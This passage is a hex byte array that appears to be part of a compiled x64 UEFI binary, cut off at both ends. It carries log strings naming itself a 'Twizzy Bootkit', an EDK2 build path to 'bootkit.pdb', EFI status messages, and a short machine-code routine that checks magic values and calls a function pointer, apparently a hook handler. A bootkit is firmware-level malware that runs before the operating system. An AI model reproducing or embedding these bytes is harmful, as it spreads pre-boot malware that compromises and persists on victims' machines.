    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x20, 0x42, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5D,
    0x20, 0x43, 0x75, 0x74, 0x65, 0x4D, 0x61, 0x69, 0x6E, 0x20, 0x65, 0x6E, 0x74, 0x65, 0x72, 0x65,
    0x64, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x43, 0x00, 0x75, 0x00, 0x74, 0x00, 0x65, 0x00,
    0x4D, 0x00, 0x61, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x20, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x65, 0x00, 0x64, 0x00, 0x0D, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x20, 0x42, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5D,
    0x20, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x73, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74,
    0x65, 0x72, 0x65, 0x64, 0x0D, 0x0A, 0x00, 0x00, 0x68, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x64, 0x00,
    0x6C, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x20, 0x00, 0x72, 0x00, 0x65, 0x00, 0x67, 0x00,
    0x69, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00, 0x65, 0x00, 0x64, 0x00, 0x0D, 0x00,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x00, 0x20, 0x00, 0x54, 0x00, 0x77, 0x00,
    0x69, 0x00, 0x7A, 0x00, 0x7A, 0x00, 0x79, 0x00, 0x20, 0x00, 0x42, 0x00, 0x6F, 0x00, 0x6F, 0x00,
    0x74, 0x00, 0x6B, 0x00, 0x69, 0x00, 0x74, 0x00, 0x20, 0x00, 0x5D, 0x00, 0x20, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0xC1, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0x8D, 0x14, 0x40, 0x48, 0x03, 0xD2, 0x48, 0xB8,
    0x3C, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x00, 0x00, 0x00,
    0x3C, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x67, 0x75, 0x69, 0x64, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x25, 0x30, 0x38, 0x78, 0x2D, 0x25, 0x30, 0x34, 0x78, 0x2D, 0x25, 0x30, 0x34, 0x78, 0x2D, 0x25,
    0x30, 0x32, 0x78, 0x25, 0x30, 0x32, 0x78, 0x2D, 0x25, 0x30, 0x32, 0x78, 0x25, 0x30, 0x32, 0x78,
    0x25, 0x30, 0x32, 0x78, 0x25, 0x30, 0x32, 0x78, 0x25, 0x30, 0x32, 0x78, 0x25, 0x30, 0x32, 0x78,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x74, 0x69,
    0x6D, 0x65, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x25, 0x30, 0x32, 0x64, 0x2F, 0x25, 0x30, 0x32,
    0x64, 0x2F, 0x25, 0x30, 0x34, 0x64, 0x20, 0x20, 0x25, 0x30, 0x32, 0x64, 0x3A, 0x25, 0x30, 0x32,
    0x64, 0x00, 0x00, 0x00, 0x25, 0x30, 0x38, 0x58, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x0A, 0x00, 0x00,
    0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x61, 0x72, 0x6E, 0x69, 0x6E, 0x67,
    0x20, 0x55, 0x6E, 0x6B, 0x6E, 0x6F, 0x77, 0x6E, 0x20, 0x47, 0x6C, 0x79, 0x70, 0x68, 0x00, 0x00,
    0x00, 0x00, 0x57, 0x61, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65,
    0x20, 0x46, 0x61, 0x69, 0x6C, 0x75, 0x72, 0x65, 0x00, 0x00, 0x00, 0x57, 0x61, 0x72, 0x6E, 0x69,
    0x6E, 0x67, 0x20, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 0x46, 0x61, 0x69, 0x6C, 0x75, 0x72, 0x65,
    0x00, 0x00, 0x00, 0x00, 0x57, 0x61, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x42, 0x75, 0x66, 0x66,
    0x65, 0x72, 0x20, 0x54, 0x6F, 0x6F, 0x20, 0x53, 0x6D, 0x61, 0x6C, 0x6C, 0x00, 0x57, 0x61, 0x72,
    0x6E, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x74, 0x61, 0x6C, 0x65, 0x20, 0x44, 0x61, 0x74, 0x61, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x61, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x46, 0x69,
    0x6C, 0x65, 0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57,
    0x61, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x52, 0x65, 0x73, 0x65, 0x74, 0x20, 0x52, 0x65, 0x71,
    0x75, 0x69, 0x72, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4C, 0x6F, 0x61, 0x64, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x50, 0x61, 0x72,
    0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x00, 0x00, 0x00, 0x00, 0x55, 0x6E, 0x73, 0x75, 0x70, 0x70,
    0x6F, 0x72, 0x74, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
    0x61, 0x64, 0x20, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x53, 0x69, 0x7A, 0x65, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x54, 0x6F, 0x6F, 0x20, 0x53,
    0x6D, 0x61, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x6F, 0x74, 0x20, 0x52, 0x65, 0x61,
    0x64, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x65,
    0x76, 0x69, 0x63, 0x65, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4F, 0x75, 0x74, 0x20, 0x6F, 0x66, 0x20, 0x52,
    0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x6F, 0x6C,
    0x75, 0x6D, 0x65, 0x20, 0x43, 0x6F, 0x72, 0x72, 0x75, 0x70, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x20, 0x46, 0x75, 0x6C, 0x6C, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x6F, 0x20, 0x4D, 0x65, 0x64, 0x69, 0x61, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x65, 0x64, 0x69,
    0x61, 0x20, 0x63, 0x68, 0x61, 0x6E, 0x67, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x4E, 0x6F, 0x74, 0x20, 0x46, 0x6F, 0x75, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x20, 0x44, 0x65, 0x6E,
    0x69, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x6F, 0x20, 0x52, 0x65,
    0x73, 0x70, 0x6F, 0x6E, 0x73, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4E, 0x6F, 0x20, 0x6D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x6F, 0x75, 0x74, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x6F, 0x74, 0x20, 0x73, 0x74,
    0x61, 0x72, 0x74, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41,
    0x6C, 0x72, 0x65, 0x61, 0x64, 0x79, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x65, 0x64, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x41, 0x62, 0x6F, 0x72, 0x74, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x43, 0x4D, 0x50, 0x20, 0x45, 0x72,
    0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x46,
    0x54, 0x50, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x50, 0x72, 0x6F, 0x74, 0x6F, 0x63, 0x6F, 0x6C, 0x20, 0x45, 0x72, 0x72, 0x6F,
    0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6E, 0x63, 0x6F, 0x6D, 0x70, 0x61, 0x74,
    0x69, 0x62, 0x6C, 0x65, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x53, 0x65, 0x63,
    0x75, 0x72, 0x69, 0x74, 0x79, 0x20, 0x56, 0x69, 0x6F, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00,
    0x00, 0x00, 0x43, 0x52, 0x43, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x6E, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x4D, 0x65,
    0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x65, 0x73, 0x65,
    0x72, 0x76, 0x65, 0x64, 0x20, 0x28, 0x32, 0x39, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x52, 0x65, 0x73, 0x65, 0x72, 0x76, 0x65, 0x64, 0x20, 0x28, 0x33, 0x30, 0x29, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x6E, 0x64, 0x20, 0x6F, 0x66, 0x20, 0x46, 0x69, 0x6C,
    0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6E, 0x76, 0x61, 0x6C,
    0x69, 0x64, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x43, 0x6F, 0x6D, 0x70, 0x72, 0x6F, 0x6D, 0x69, 0x73, 0x65, 0x64, 0x20, 0x44, 0x61, 0x74, 0x61,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x50, 0x20, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20,
    0x43, 0x6F, 0x6E, 0x66, 0x6C, 0x69, 0x63, 0x74, 0x00, 0x00, 0x48, 0x54, 0x54, 0x50, 0x20, 0x45,
    0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
    0x74, 0x00, 0x00, 0x00, 0x2C, 0x4B, 0x00, 0x00, 0x2C, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53,
    0x24, 0xCF, 0x82, 0xBE, 0xC4, 0x0F, 0x84, 0x42, 0x92, 0x51, 0x46, 0x3C, 0xC7, 0x68, 0x04, 0x0F,
    0x53, 0x00, 0x00, 0x00, 0x45, 0x3A, 0x5C, 0x65, 0x64, 0x6B, 0x32, 0x5C, 0x42, 0x75, 0x69, 0x6C,
    0x64, 0x5C, 0x42, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x50, 0x6B, 0x67, 0x5C, 0x44, 0x45, 0x42,
    0x55, 0x47, 0x5F, 0x56, 0x53, 0x32, 0x30, 0x32, 0x32, 0x5C, 0x58, 0x36, 0x34, 0x5C, 0x42, 0x6F,
    0x6F, 0x74, 0x6B, 0x69, 0x74, 0x50, 0x6B, 0x67, 0x5C, 0x62, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74,
    0x5C, 0x69, 0x6D, 0x70, 0x6C, 0x5C, 0x62, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5C, 0x44, 0x45,
    0x42, 0x55, 0x47, 0x5C, 0x62, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x2E, 0x70, 0x64, 0x62, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x41, 0x54, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x28, 0x4D, 0x89, 0xCC, 0x4D, 0x85, 0xE4, 0x74, 0x35,
    0x49, 0x81, 0x7C, 0x24, 0x20, 0x2D, 0xA1, 0xE7, 0x12, 0x75, 0x2A, 0x49, 0xBA, 0xEF, 0xBE, 0xAD,
    0xDE, 0xEF, 0xBE, 0xAD, 0xDE, 0x4D, 0x85, 0xD2, 0x74, 0x1B, 0x4C, 0x89, 0xE1, 0x4C, 0x89, 0xD2,
    0x4D, 0x8B, 0x5A, 0x78, 0x4D, 0x85, 0xDB, 0x74, 0x0C, 0x41, 0xFF, 0xD3, 0x48, 0x83, 0xC4, 0x28,
    0x41, 0x5D, 0x41, 0x5C, 0xC3, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0x41, 0x5D,
    0x41, 0x5C, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
